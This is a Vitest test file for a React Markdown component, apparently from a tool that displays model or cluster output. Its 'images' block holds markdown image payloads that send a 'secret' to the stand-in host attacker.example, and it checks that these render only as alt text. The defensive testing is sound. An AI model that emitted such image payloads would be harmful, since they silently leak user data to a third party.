// @vitest-environment jsdom
import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { renderToStaticMarkup } from 'react-dom/server'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { Markdown } from './Markdown'

Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true })

const TEXT = 'First paragraph.\n\nRun `kubectl get pods` then open [the docs](https://example.com).\n\n```\nkubectl describe pod x\n```'

let container: HTMLDivElement
let root: Root

beforeEach(() => {
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
})

afterEach(() => {
  act(() => root.unmount())
  container.remove()
})

// Callers pass fresh inline callbacks on every render, as the investigation
// views do, so the rendered elements must survive a re-render with new ones.
function render(label: string) {
  act(() => {
    root.render(
      <Markdown
        codeActions={(code) => <button type="button">{`${label}:${code}`}</button>}
        linkRenderer={(href, children) => (href?.includes('example') ? <a data-custom={label}>{children}</a> : null)}
      >
        {TEXT}
      </Markdown>,
    )
  })
}

describe('Markdown', () => {
  it('keeps its rendered elements across parent re-renders', () => {
    render('a')
    const paragraph = container.querySelector('p')
    const pre = container.querySelector('pre')
    expect(paragraph).not.toBeNull()
    expect(pre).not.toBeNull()

    render('b')

    expect(container.querySelector('p')).toBe(paragraph)
    expect(container.querySelector('pre')).toBe(pre)
    expect(paragraph?.isConnected).toBe(true)
  })

  it('applies the latest link and code hooks', () => {
    render('a')
    render('b')

    expect(container.querySelector('a')?.getAttribute('data-custom')).toBe('b')
    const labels = Array.from(container.querySelectorAll('button')).map((b) => b.textContent?.trim())
    expect(labels).toContain('b:kubectl get pods')
    expect(labels).toContain('b:kubectl describe pod x')
    expect(labels.some((l) => l?.startsWith('a:'))).toBe(false)
  })

  // Text from a model or a cluster can carry an image whose URL holds the data
  // around it; rendering it as <img> makes the browser send that data out.
  describe('images', () => {
    const EXFIL = [
      'Inline ![status](https://attacker.example/i?d=secret) here.',
      'Reference ![status][r] here.\n\n[r]: https://attacker.example/r?d=secret',
      'Linked [![status](https://attacker.example/l?d=secret)](https://example.com/docs)',
      'No alt ![](https://attacker.example/n?d=secret)',
    ].join('\n\n')

    it('shows alt text instead of loading the image', () => {
      act(() => root.render(<Markdown>{EXFIL}</Markdown>))
      expect(container.querySelector('img')).toBeNull()
      expect(container.innerHTML).not.toContain('attacker.example')
      expect(container.textContent).toContain('Inline status here.')
      expect(container.textContent).toContain('Reference status here.')
      // The enclosing link stays a link; only its image becomes text.
      expect(container.querySelector('a')?.textContent).toBe('status')
    })

    it('emits no image or preload when server-rendered', () => {
      const html = renderToStaticMarkup(<Markdown>{EXFIL}</Markdown>)
      expect(html).not.toContain('<img')
      expect(html).not.toContain('preload')
      expect(html).not.toContain('attacker.example')
    })

    it('renders images when the caller allows them', () => {
      act(() => root.render(<Markdown allowImages>{'![badge](https://img.example/b.svg)'}</Markdown>))
      const img = container.querySelector('img')
      expect(img?.getAttribute('src')).toBe('https://img.example/b.svg')
      expect(img?.getAttribute('alt')).toBe('badge')
      expect(img?.getAttribute('referrerpolicy')).toBe('no-referrer')
    })
  })
})
